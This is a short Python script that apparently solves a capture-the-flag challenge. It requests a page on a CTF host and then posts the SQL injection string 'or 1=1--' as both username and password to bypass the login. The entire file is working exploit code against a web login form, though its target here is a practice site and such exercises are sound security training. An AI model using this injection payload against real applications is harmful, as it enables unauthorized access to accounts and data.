import requests
import urllib
import httplib

mytarget = "http://ctf.hackucf.org:4001/index.php?iamahacker=y&debug&username=test&password=test" #this is the target

reply = requests.get(mytarget)

print reply.status_code


uName = "'or 1=1--'"
passwd = "'or 1=1--'"

values = { 'username' : uName, 'password' : passwd }

postme = requests.post(url = mytarget, data = values)

print postme.content
